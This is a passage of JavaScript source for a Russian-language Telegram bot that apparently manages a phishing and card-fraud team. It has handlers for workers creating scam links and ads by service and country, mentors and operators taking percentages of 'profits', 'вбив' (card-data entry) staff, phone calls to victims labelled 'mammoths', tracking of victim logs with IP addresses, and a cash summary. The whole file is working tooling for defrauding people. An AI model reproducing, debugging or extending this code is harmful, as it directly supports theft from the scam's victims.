);

bot.action(/^screen2_(\w+)$/, (ctx) =>
  ctx.scene.enter("screenshot2", {
    adId: ctx.match[1],
  })
);
bot.action(/^screen3_(\w+)$/, (ctx) =>
  ctx.scene.enter("screenshot3", {
    adId: ctx.match[1],
  })
);
bot.action(/^screen4_(\w+)$/, (ctx) =>
  ctx.scene.enter("screenshot4", {
    adId: ctx.match[1],
  })
);



async function renderServicesPage(ctx, page = 1) {
  try {
    const user = await User.findOne({ where: { id: ctx.from.id } });
    let selectedServices = [];

    // Получаем избранные
    try {
      selectedServices = user.mainService ? JSON.parse(user.mainService) : [];
      if (!Array.isArray(selectedServices)) selectedServices = [];
    } catch (e) {
      selectedServices = [];
    }

    const limit = 20;
    const offset = (page - 1) * limit;

    const { rows: services, count } = await Service.findAndCountAll({
      where: { status: 1 },
      include: [
        {
          model: Country,
          as: 'country', // замените на актуальное имя ассоциации, если оно другое
          where: { status: 1 },
        },
      ],
      order: [["title", "asc"]],
      limit,
      offset,
    });


    const totalPages = Math.max(1, Math.ceil(count / limit));

    // Формируем кнопки сервисов
    const buttons = chunk(
      services.map((service) => {
        const isSelected = selectedServices.includes(service.code);
        return Markup.callbackButton(
          `${isSelected ? "✅" : "☑️"} ${service.title}`,
          `toggle_mainService_${service.code}_${page}`
        );
      }),
      2
    );

    // Навигация
    const navButtons = [];
    if (page > 1)
      navButtons.push(
        Markup.callbackButton("◀️ Назад", `mainServicePage_${page - 1}`)
      );
    if (page < totalPages)
      navButtons.push(
        Markup.callbackButton("➡️ Вперёд", `mainServicePage_${page + 1}`)
      );
    if (navButtons.length) buttons.push(navButtons);

    // Очистка и назад
    buttons.push([
      Markup.callbackButton("❌ Очистить избранные", "clear_mainService"),
    ]);
    buttons.push([Markup.callbackButton("◀️ Назад", "settings")]);

    const replyMarkup = Markup.inlineKeyboard(buttons);

    const messageText = `📦 Выберите сервис(ы) (Страница ${page}/${totalPages}):`;

    // Если сообщение уже есть, пробуем обновить только кнопки
    const oldMessage = ctx.update.callback_query?.message;

    if (oldMessage && oldMessage.text === messageText) {
      try {
        await ctx.editMessageReplyMarkup(replyMarkup);
      } catch (err) {
        if (
          err.description &&
          err.description.includes("message is not modified")
        ) {
          // Ожидаемая ошибка, ничего не делаем
        } else {
          console.error("❌ Ошибка при обновлении клавиатуры:", err);
        }
      }
    } else {
      // Если текста нет или отличается — редактируем полностью
      await ctx.editMessageText(messageText, {
        parse_mode: "HTML",
        reply_markup: replyMarkup,
      });
    }
  } catch (err) {
    console.error("❌ Ошибка:", err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
}

bot.action("mainService", (ctx) => renderServicesPage(ctx, 1));
bot.action(/^mainServicePage_(\d+)$/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  await renderServicesPage(ctx, page);
});
bot.action(/^toggle_mainService_(\w+)_(\d+)$/, async (ctx) => {
  try {
    const serviceCode = ctx.match[1];
    const page = parseInt(ctx.match[2]);
    const user = await User.findOne({ where: { id: ctx.from.id } });

    let selectedServices = [];
    try {
      selectedServices = user.mainService ? JSON.parse(user.mainService) : [];
      if (!Array.isArray(selectedServices)) selectedServices = [];
    } catch (e) {
      selectedServices = [];
    }

    // Добавляем или убираем сервис
    if (selectedServices.includes(serviceCode)) {
      selectedServices = selectedServices.filter(
        (code) => code !== serviceCode
      );
    } else {
      selectedServices.push(serviceCode);
    }

    await User.update(
      { mainService: JSON.stringify(selectedServices) },
      { where: { id: ctx.from.id } }
    );

    await renderServicesPage(ctx, page);
    await ctx.answerCbQuery("✅ Обновлено");
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("clear_mainService", async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.from.id } });

    let selectedServices = [];
    try {
      selectedServices = user.mainService ? JSON.parse(user.mainService) : [];
      if (!Array.isArray(selectedServices)) selectedServices = [];
    } catch (e) {
      selectedServices = [];
    }

    if (selectedServices.length === 0) {
      await ctx.answerCbQuery("ℹ️ У вас нет избранных сервисов", {
        show_alert: true,
      });
      return;
    }

    // Очищаем
    await User.update(
      { mainService: JSON.stringify([]) },
      { where: { id: ctx.from.id } }
    );

    // Передаём флаг, чтобы изменить текст
    await renderServicesPage(ctx, 1, true);

    await ctx.answerCbQuery("❌ Избранные сервисы очищены");
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("mentor_students", async (ctx) => {
  try {
    const { count, rows } = await User.findAndCountAll({
      where: {
        mentor: ctx.from.id,
      },
    });

    var buttons = chunk(
      rows.map((v) =>
        Markup.callbackButton(`@${v.username}`, `manageMentor_${v.id}`)
      ),
      3
    );

    if (buttons.length < 1)
      buttons = [[Markup.callbackButton("Страница пуста", "none")]];
    await ctx.answerCbQuery("👨‍🎓 Получаю учеников ").catch((err) => err);

    return ctx
      .replyOrEdit(`👨‍🎓 Управление твоими учениками (Всего: ${count}):`, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("◀️ Назад", `menu_mentor`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^manageMentor_(\d+)$/, async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.match[1] } });

    const profitsCount = await Profit.count({
      where: {
        userId: ctx.match[1],
      },
    });

    await ctx.answerCbQuery("👨‍🎓 Получаю ученика ").catch((err) => err);

    return ctx
      .replyOrEdit(
        `👨‍🎓 <b>Ученик:</b> @${user.username}
            
💰 Общее кол-во его профитов: <b>${profitsCount}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "❌ Удалить",
                `deleteStudent_${ctx.match[1]}`
              ),
            ],
            [Markup.callbackButton("◀️ Назад", `mentor_students`)],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^deleteStudent_(\d+)$/, async (ctx) => {
  try {
    await User.update(
      {
        mentor: null,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );

    await User.update(
      {
        requestMentor: 0,
      },
      { where: { id: ctx.from.id } }
    );

    await ctx.telegram.sendMessage(
      ctx.match[1],
      `<b>🎓 Наставник @${ctx.from.username} отказался от вас.</b> `,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.urlButton(
              "💬 Связаться с наставником",
              `t.me/${ctx.from.username}`
            ),
          ],
        ]),
      }
    );

    return ctx
      .replyOrEdit("✅ Ученик удален", {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("◀️ Назад", `mentor_students`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("menu_mentor", async (ctx) => {
  try {
    const mentor = await Nastavniki.findOne({ where: { id: ctx.from.id } });

    const profitsCount = await Profit.count({
      where: { mentor: ctx.from.id },
    });

    // Получаем сумму всех профитов
    const amount = parseInt(
      await Profit.sum("amount", { where: { mentor: ctx.from.id } })
    );




    await ctx.answerCbQuery("🙊 Уже открываю ").catch((err) => err);

    return ctx
      .replyOrEdit(
        `<b>🎓 Ваша панель Наставника</b>
   
📄 Ваша Анкета: <b>${mentor.about == null ? "Отсутствует" : mentor.about}</b>
💯 Ваш процент: <b>${mentor.percent == null ? "Процент не указан" : mentor.percent
        }</b>

💰 Профитов с учеников: <b>${profitsCount} (${amount} USD)</b>
`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("👨‍🎓 Ученики", "mentor_students")],

            [
              Markup.callbackButton(
                "💯 Установить процент",
                "set_mentor_percent"
              ),
              Markup.callbackButton("📄 Установить анкету", "set_mentor_about"),
            ],
            [Markup.callbackButton("◀️ Назад", "start")],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^mentor_(accept|decline)_(\d+)$/, async (ctx) => {
  try {
    await ctx.deleteMessage().catch((err) => err);

    await User.update(
      {
        requestMentor: 0,
      },
      { where: { id: ctx.match[2] } }
    );

    if (ctx.match[1] == "accept") {
      await User.update(
        { mentor: ctx.from.id },
        { where: { id: ctx.match[2] } }
      );

      await ctx.answerCbQuery("✅ Вы успешно приняли заявку ученика!", true);
      return ctx.telegram.sendMessage(
        ctx.match[2],
        `✅ Твоя заявка была одобрена, отпиши своему наставнику в ЛС!`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `🎓 ${ctx.from.username}`,
                `https://t.me/${ctx.from.username}`
              ),
            ],
          ]),
        }
      );
    } else {
      await User.update(
        {
          requestMentor: 0,
        },
        { where: { id: ctx.match[2] } }
      );
      await ctx.answerCbQuery("❌ Вы успешно отклонили заявку ученика!", true);

      return ctx.telegram.sendMessage(
        ctx.match[2],
        `❌ Твоя заявка была отклонена, если не согласен, отпиши наставнику в ЛС!`,
        {
          parse_mode: "HTML",

          reply_markup: Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `🎓 ${ctx.from.username}`,
                `https://t.me/${ctx.from.username}`
              ),
            ],
          ]),
        }
      );
    }
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^mentor_select_(\d+)$/, async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.from.id } });

    if (user.requestMentor == 1) {
      // await ctx.deleteMessage().catch((err) => err);

      await ctx.replyWithHTML(`❌ Ты уже подал заявку! Ожидайте. `, {
        parse_mode: "HTML",
      });
    } else {
      await User.update(
        {
          requestMentor: 1,
        },
        { where: { id: ctx.from.id } }
      );

      const id = ctx.match[1];
      // await ctx.deleteMessage().catch((err) => err);
      await ctx
        .replyWithHTML(`✅ Заявка наставнику успешно подана.`, {
          parse_mode: "HTML",
        })
        .catch((err) => err);
      return ctx.telegram
        .sendMessage(id, `Воркер @${ctx.from.username} хочет обучаться у вас`, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "✅ Принять",
                `mentor_accept_${ctx.from.id}`
              ),
              Markup.callbackButton(
                "❌ Отклонить",
                `mentor_decline_${ctx.from.id}`
              ),
            ],
          ]),
        })

        .catch((err) => err);
    }
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^mentor_(\d+)$/, async (ctx) => {
  try {
    const id = ctx.match[1];
    const users = await User.findOne({ where: { id: ctx.from.id } });
    const user = await User.findOne({ where: { id: id } });
    const mentor = await Nastavniki.findOne({ where: { id: id } });

    const profitsCount = await Profit.count({
      where: {
        mentor: mentor.id,
      },
    });

    const profitsSum = await Profit.sum("amount", {
      where: {
        mentor: mentor.id,
      },
    });

    const profitsTotal = profitsSum ? profitsSum.toFixed(2) : "0.00";

    // 🟢 Количество воркеров (пользователей с этим наставником)
    const workersCount = await User.count({
      where: {
        mentor: mentor.id,
      },
    });

    // 📅 Дата добавления наставника
    const createdAt = mentor.createdAt
      ? new Date(mentor.createdAt).toLocaleDateString("ru-RU")
      : "неизвестно";

    if (users.isMentor) {
      await ctx.answerCbQuery("❌ Ты уже наставник!").catch((err) => err);

      return ctx
        .replyOrEdit(`<b>❌ Ты уже наставник!</b>`, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("🎓 Меню Наставника", "menu_mentor")],
            [Markup.callbackButton("◀️ В главное меню", "start")],
          ]),
        })
        .catch((err) => err);
    } else {
      await ctx.answerCbQuery("🎓 Получаю наставника").catch((err) => err);

      return ctx
        .replyOrEdit(
          `🎓 Наставник: <b>${user.username ? `@${user.username}` : `ID: ${user.id}`
          }</b> ${mentor.percent == null
            ? "(Процент не указан)"
            : `<b>${mentor.percent}%</b>`
          }

<blockquote>Кол-во профитов: <b>${profitsCount}</b>
Сумма профитов: <b>${profitsTotal} USD</b>
Количество воркеров: <b>${workersCount}</b>
Дата добавления: <b>${createdAt}</b>

Описание: <b>${mentor.about == null ? "не указано" : mentor.about
          }</b></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "✅ Выбрать наставника",
                  `mentor_select_${id}`
                ),
              ],
              [Markup.callbackButton("◀️ Назад", `teachers`)],
            ]),
          }
        )
        .catch((err) => err);
    }
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("send_request", async (ctx) => {
  try {
    if (await ctx.state.user.getRequest())
      return ctx.deleteMessage().catch((err) => err);
    return ctx.scene.enter("send_request");
  } catch (err) { }
});

bot.use(requests);

bot.action("changetrc", async (ctx) => {
  return ctx.scene.enter("change_trc");
});

bot.action("admin_sms", async (ctx) => {
  return ctx.scene.enter("admin_sms");
});

bot.action("send_log", async (ctx) => {
  return ctx.scene.enter("send_log");
});

bot.action(/^answer_worker_(\d+)$/, async (ctx) => {
  const userId = ctx.match[1];

  ctx.scene.state.userId = userId;
  return ctx.scene.enter("answer_worker");
});
bot.action(/^change_fio_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("change_fio");
});

bot.action(/^change_address_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("change_address");
});

bot.action(/^change_title_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("change_title");
});

bot.action(/^change_title_temp_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("change_title_temp");
});
bot.action(/^change_text_temp_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("change_text_temp");
});

bot.action("delete", async (ctx) => {
  try {
    await ctx.answerCbQuery("❌ Сообщение скрыто ").catch((err) => err);

    return ctx.deleteMessage().catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("format_tp", format_tp);

bot.action("select_smartsupp", async (ctx) => {
  return ctx.scene.enter("select_smartsupp");
});

bot.command("tp", operators);

bot.command("menu", async (ctx) => {
  if (!ctx.from || !ctx.from.id || !ctx.chat) {
    return ctx.reply("❌ Ошибка: данные пользователя недоступны.");
  }

  if (ctx.chat.id === ctx.from.id) {
    // If in a private chat, call the personal menu handler
    await menu2(ctx);
  } else {
    try {
      // Fetch work status
      const workStatus = ctx.state.bot.work ? "🟢 Работает" : "🔴 Остановлено";

      // Fetch earnings
      const kassa_today =
        (await Profit.sum("Amount", {
          where: {
            createdAt: { [Sequelize.Op.gte]: moment().startOf("day").toDate() },
          },
        })) || 0;

      const kassa_yesterday =
        (await Profit.sum("Amount", {
          where: {
            createdAt: {
              [Sequelize.Op.between]: [
                moment().subtract(1, "days").startOf("day").toDate(),
                moment().subtract(1, "days").endOf("day").toDate(),
              ],
            },
          },
        })) || 0;

      const kassa_month =
        (await Profit.sum("Amount", {
          where: {
            createdAt: {
              [Sequelize.Op.gte]: moment().startOf("month").toDate(),
            },
          },
        })) || 0;

      const kassa_total = (await Profit.sum("Amount")) || 0;

      // Fetch active writers

      // Формируем список активных вбиверов
      const writers = await Writer.findAll();
      const vbivText = writers.length
        ? `<b>✍️ На вбиве:</b>\n${writers
          .map((writer) => `- @${writer.username}`)
          .join("\n")}`
        : "✍️ На вбиве никого нет";

      // Формируем список операторов
      const operators = await Operators.findAll();
      const supportText = operators.length
        ? `<b>👨🏼‍💻 Операторы:</b>\n${operators
          .map(
            (operator) =>
              `- @${operator.username} (${operator.percent || 0}%) ${operator.work ? "🟢" : "🔴"
              }`
          )
          .join("\n")}`
        : "👨🏼‍💻 Операторов нет";

      // Сводка по кассе и статусам
      const menuText = `
<b>Статус:</b> ${workStatus}

💰 <b>Касса:</b> $${kassa_today.toFixed(2)} (сегодня)
- Вчера: $${kassa_yesterday.toFixed(2)}
- Месяц: $${kassa_month.toFixed(2)}
- Всего: $${kassa_total.toFixed(2)}

${vbivText}

${supportText}
`;

      // Send the message with inline buttons
      return ctx.replyWithHTML(menuText, {
        reply_markup: Markup.inlineKeyboard([
          Markup.callbackButton("🏆 Топ", "workers_top1"),
          Markup.callbackButton("❌ Скрыть", "delete"),
        ]),
      });
    } catch (err) {
      console.error(err);
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
});

bot.action("status", async (ctx) => {
  if (ctx.chat.id === ctx.from.id) {
    await menu2(ctx); // Если это личный чат, вызываем другую функцию
  } else {
    try {
      // Получаем статус работы
      const workStatus = ctx.state.bot.work ? "🟢 Работает" : "🔴 Остановлено";

      // Получаем данные о кассе
      const kassa_today =
        (await Profit.sum("Amount", {
          where: {
            createdAt: { [Sequelize.Op.gte]: moment().startOf("day").toDate() },
          },
        })) || 0;

      const kassa_yesterday =
        (await Profit.sum("Amount", {
          where: {
            createdAt: {
              [Sequelize.Op.between]: [
                moment().subtract(1, "days").startOf("day").toDate(),
                moment().subtract(1, "days").endOf("day").toDate(),
              ],
            },
          },
        })) || 0;

      const kassa_month =
        (await Profit.sum("Amount", {
          where: {
            createdAt: {
              [Sequelize.Op.gte]: moment().startOf("month").toDate(),
            },
          },
        })) || 0;

      const kassa_total = (await Profit.sum("Amount")) || 0;

      // Формируем список активных вбиверов
      const writers = await Writer.findAll();
      const vbivText = writers.length
        ? `<b>✍️ На вбиве:</b>\n${writers
          .map((writer) => `- @${writer.username}`)
          .join("\n")}`
        : "✍️ На вбиве никого нет";

      // Формируем список операторов
      const operators = await Operators.findAll();
      const supportText = operators.length
        ? `<b>👨🏼‍💻 Операторы:</b>\n${operators
          .map(
            (operator) =>
              `- @${operator.username} (${operator.percent || 0}%) ${operator.work ? "🟢" : "🔴"
              }`
          )
          .join("\n")}`
        : "👨🏼‍💻 Операторов нет";

      // Сводка по кассе и статусам
      const menuText = `
<b>Статус:</b> ${workStatus}

💰 <b>Касса:</b> $${kassa_today.toFixed(2)} (сегодня)
- Вчера: $${kassa_yesterday.toFixed(2)}
- Месяц: $${kassa_month.toFixed(2)}
- Всего: $${kassa_total.toFixed(2)}

${vbivText}

${supportText}
      `;

      // Используем либо ctx.reply, либо ctx.editMessageText для обновления сообщения
      if (ctx.callbackQuery) {
        await ctx.editMessageText(menuText, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            Markup.callbackButton("🏆 Топ", "workers_top1"),
            Markup.callbackButton("❌ Скрыть", "delete"),
          ]),
        });
      } else {
        await ctx.reply(menuText, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            Markup.callbackButton("🏆 Топ", "workers_top1"),
            Markup.callbackButton("❌ Скрыть", "delete"),
          ]),
        });
      }
    } catch (err) {
      console.log(err);
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
});

bot.action("start", menu);

bot.start(async (ctx) => {
  if (ctx.chat.id == ctx.from.id) {
    try {
      const userId = ctx.from.id;
      const referrerId = ctx.startPayload ? parseInt(ctx.startPayload) : null;

      if (referrerId && referrerId !== userId) {
        // Проверим, существует ли уже реферальная запись для этого пользователя
        const existingReferral = await Referral.findOne({
          where: { userId: userId },
        });
        const user = await User.findOne({ where: { id: referrerId } });

        if (!existingReferral) {
          // Создаем новую реферальную запись
          await Referral.create({
            userId: userId,
            referrerId: referrerId,
            percent: 0, // Преобразуйте значение в строку
            profitAmount: 0, // Преобразуйте значение в строку
          });

          // Отправляем уведомление рефералу
          ctx.telegram.sendMessage(
            referrerId,
            `<b>🎉 Новый пользователь зарегистрировался по вашей реферальной ссылке!</b>`,
            {
              parse_mode: "HTML",
            }
          );

          // Отправляем приветственное сообщение новому пользователю
          ctx.replyWithHTML(`<b>Добро пожаловать!</b> Вы зарегистрировались по реферальной ссылке. 

Ваш реферал: <b>@${user.username}</b>`);
        }
      } else {
        // Приветственное сообщение для новых пользователей без реферальной ссылки
        ctx.reply(`Добро пожаловать!`);
      }

      // Вызовите вашу функцию menu2
      menu2(ctx);
    } catch (error) {
      console.error(error);
      ctx.reply(
        "Произошла ошибка при обработке вашего запроса. Пожалуйста, попробуйте позже."
      );
    }
  }
});

bot.command("leavealllogs", async (ctx) => {
  const settings = await Settings.findByPk(1);

  if (ctx.state.user.status !== 1 && ctx.state.user.status !== 2) {
    return ctx.reply("⛔ Эта команда доступна только активным вбиверам.");
  }

  // Получаем все логи пользователя
  const logs = await Log.findAll({
    where: { writerId: ctx.from.id },
    attributes: ["id", "adId", "chatMsg2"],
  });

  if (!logs.length) {
    return ctx.replyWithHTML(
      "<b>ℹ️ У вас нет логов, от которых можно отказаться.</b>",
      {
        reply_to_message_id: ctx.message.message_id,
      }
    );
  }

  const adIds = logs.map((log) => log.adId).filter(Boolean);

  await Log.update({ writerId: null }, { where: { writerId: ctx.from.id } });

  // Ответ пользователю
  await ctx.reply(
    `<b>🚫 Вы успешно отказались от ${adIds.length} лог(а/ов)!</b>`,
    {
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("❌ Скрыть", "delete")],
      ]),
    }
  );

  // Уведомление в лог-группу
  await ctx.telegram.sendMessage(
    settings.logsGroupId,
    `<b>🚫 Пользователь @${ctx.from.username || "без username"} отказался от ${adIds.length
    } лог(а/ов).</b>`,
    { parse_mode: "HTML" }
  );
});

bot.action("create_link", createLink);
bot.action("create_link1", createLink1);

bot.action("send_sms", (ctx) => ctx.scene.enter("send_sms"));

bot.action(/^support_(\d+)_send_message$/, async (ctx) => {
  try {
    if (ctx.state.user.smartsupp) {
      return ctx.answerCbQuery("❌ Для этого у вас есть Smartsupp", true);
    }

    if (ctx.state.user.operator) {
      return ctx.answerCbQuery("❌ Для этого у вас есть оператор", true);
    } else {
      return ctx.scene.enter("support_send_message", {
        supportId: ctx.match[1],
      });
    }
  } catch (err) {
    ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^create_link_([A-Za-z0-9]+)$/, (ctx) =>
  createLinkCountry(ctx, ctx.match[1])
);
bot.action(/^create_link1_([A-Za-z0-9]+)$/, (ctx) =>
  createLinkCountry1(ctx, ctx.match[1])
);

bot.action(/^my_ads_(\d+)$/, (ctx) => myAds(ctx, ctx.match[1]));
bot.action(/^my_ad_(\d+)$/, (ctx) => myAd(ctx, ctx.match[1]));
bot.action(/^my_create_ad_(\d+)$/, (ctx) => myCreateAd(ctx, ctx.match[1]));

bot.action(/^my_profits_(\d+)$/, (ctx) => myProfits(ctx, ctx.match[1]));
bot.action(/^my_profit_(\d+)$/, (ctx) => myProfit(ctx, ctx.match[1]));

bot.action("settings", settings);
bot.action("notifications", notifications);

bot.action(/^userLog_(\d+)_(otherCard|correctBalance)$/, async (ctx) => {
  try {
    const logId = ctx.match[1];
    const status = ctx.match[2];

    const log = await Log.findOne({
      where: { id: logId },
      include: [
        {
          association: "ad",
          required: true,
          include: [
            { association: "service", required: true, include: [{ association: "country", required: true }] },
            { association: "user", required: true },
          ],
        },
      ],
    });

    if (!log) {
      return ctx.answerCbQuery("❌ Лог не найден", { show_alert: true });
    }

    await log.update({ status });

    const ipBinding = await IpBinding.findOne({ where: { ip: log.ip } });
    const mammothTag = ipBinding?.identifier ? `#${ipBinding.identifier}` : "отсутствует";

    let changerRole = "Пользователь";
    let isOperator = false;

    if (ctx.from.id === log.ad.userId) {
      changerRole = "Воркер";
    } else {
      const operator = await Operators.findOne({ where: { userId: ctx.from.id } });
      if (operator) {
        changerRole = "Оператор";
        isOperator = true;
      }
    }

    await ctx
      .answerCbQuery(`✅ Вы изменили статус мамонта на ${locale.statuses[status]}`)
      .catch((err) => err);

    await ctx.telegram.sendMessage(
      ctx.state.bot.logsGroupId,
      `🔄 <b>${changerRole}</b> изменил статус мамонта на <b>${locale.statuses[status]}</b>\n\n🦣 <b>${mammothTag}</b>\n\n🔍 <b>#id${log.ad.id}</b>`,
      { parse_mode: "HTML", reply_to_message_id: log.chatMsg }
    );

    if (isOperator) {
      await ctx.telegram.sendMessage(
        log.ad.userId,
        `🔔 <b>Оператор изменил статус вашего мамонта на ${locale.statuses[status]}</b>\n\n🦣 <b>${mammothTag}</b>\n\n🔍 <b>#id${log.ad.id}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("❌ Скрыть", `delete`)],
          ]),
        }
      );
    }
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^userLog_(\d+)_call_(\d+)$/, async (ctx) => {
  const logId = ctx.match[1];
  const clickedUserId = Number(ctx.match[2]);

  const log = await Log.findOne({
    where: { id: logId },
    include: [{ association: "ad", include: ["user", "service"] }],
  });

  if (!log) return ctx.answerCbQuery("❌ Лог не найден", { show_alert: true });

  return ctx.scene.enter("callLogScene", {
    logId: log.id,
    adId: log.ad.id,
    userId: log.ad.userId,
    service: log.ad.service,
    clickedUserId, // <- кто нажал кнопку
  });
});

// Заглушка для неактивных кнопок
bot.action("noop", async (ctx) => {
  await ctx.answerCbQuery("⛔ Действие недоступно", { show_alert: true });
});


// ✅ Принять прозвон
bot.action(/^call_accept_(\d+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];
    const username = ctx.from.username ? `@${ctx.from.username}` : `ID ${ctx.from.id}`;
    const userId = ctx.from.id;

    const ad = await Ad.findOne({
      where: { id: adId },
      include: ["user", "service"],
    });

    if (!ad) return await ctx.answerCbQuery("❌ Объявление не найдено", { show_alert: true });
    await ad.update({ call: 1 });

    const service = ad.service.title;
    const adTitle = ad.title || "Без названия";

    // Обновление кнопки
    await ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [Markup.callbackButton(`📞 Прозванивает: ${username}`, "noop")],
        [Markup.callbackButton("✅ Завершить прозвон", `call_finish_${adId}`)],
      ])
    );

    await ctx.answerCbQuery("✅ Вы взяли прозвон");

    // Уведомления
    if (ad.userId && ad.userId !== userId) {
      await ctx.telegram.sendMessage(
        ad.userId,
        `📞 <b>${username}</b> принял прозвон по вашему объявлению:\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }

    const operatorId = ad.user.operator;
    if (operatorId && Number(operatorId) !== Number(userId)) {
      await ctx.telegram.sendMessage(
        operatorId,
        `📞 <b>${username}</b> принял прозвон по объявлению #id${ad.id}\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }
  } catch (err) {
    console.error("Ошибка при принятии прозвона:", err);
    await ctx.answerCbQuery("❌ Ошибка", { show_alert: true });
  }
});


// ❌ Отклонить прозвон
bot.action(/^call_decline_(\d+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];
    const username = ctx.from.username ? `@${ctx.from.username}` : `ID ${ctx.from.id}`;
    const userId = ctx.from.id;

    const ad = await Ad.findOne({
      where: { id: adId },
      include: ["user", "service"],
    });

    if (!ad) return await ctx.answerCbQuery("❌ Объявление не найдено", { show_alert: true });

    const service = ad.service.title;
    const adTitle = ad.title || "Без названия";

    // Обновление кнопки
    await ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [Markup.callbackButton("❌ Прозвон отклонён", "noop")],
        [Markup.callbackButton("🔄 Возобновить прозвон", `call_restart_${adId}`)],
      ])
    );

    await ctx.answerCbQuery("❌ Прозвон отклонён");

    if (ad.userId && ad.userId !== userId) {
      await ctx.telegram.sendMessage(
        ad.userId,
        `🚫 <b>${username}</b> отклонил прозвон по вашему объявлению:\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }

    const operatorId = ad.user.operator;
    if (operatorId && Number(operatorId) !== Number(userId)) {
      await ctx.telegram.sendMessage(
        operatorId,
        `🚫 <b>${username}</b> отклонил прозвон по объявлению #id${ad.id}\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }
  } catch (err) {
    console.error("Ошибка при отклонении прозвона:", err);
    await ctx.answerCbQuery("❌ Ошибка", { show_alert: true });
  }
});


// 🔄 Возобновить прозвон
bot.action(/^call_restart_(\d+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];
    const username = ctx.from.username ? `@${ctx.from.username}` : `ID ${ctx.from.id}`;
    const userId = ctx.from.id;

    const ad = await Ad.findOne({
      where: { id: adId },
      include: ["user", "service"],
    });

    if (!ad) {
      return await ctx.answerCbQuery("❌ Объявление не найдено", { show_alert: true });
    }

    const adTitle = ad.title || "Без названия";
    const service = ad.service.title;

    await ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [
          Markup.callbackButton("✅ Принять прозвон", `call_accept_${adId}`),
          Markup.callbackButton("❌ Отклонить прозвон", `call_decline_${adId}`),
        ],
      ])
    );

    await ctx.answerCbQuery("🔄 Прозвон возобновлён");

    // Уведомление воркеру
    if (ad.userId && ad.userId !== userId) {
      await ctx.telegram.sendMessage(
        ad.userId,
        `🔄 <b>${username}</b> возобновил прозвон по вашему объявлению:\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }

    // Уведомление оператору
    const operatorId = ad.user.operator;
    if (operatorId && Number(operatorId) !== Number(userId)) {
      await ctx.telegram.sendMessage(
        operatorId,
        `🔄 <b>${username}</b> возобновил прозвон по объявлению #id${ad.id}:\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }
  } catch (err) {
    console.error("Ошибка при возобновлении прозвона:", err);
    await ctx.answerCbQuery("❌ Ошибка", { show_alert: true });
  }
});



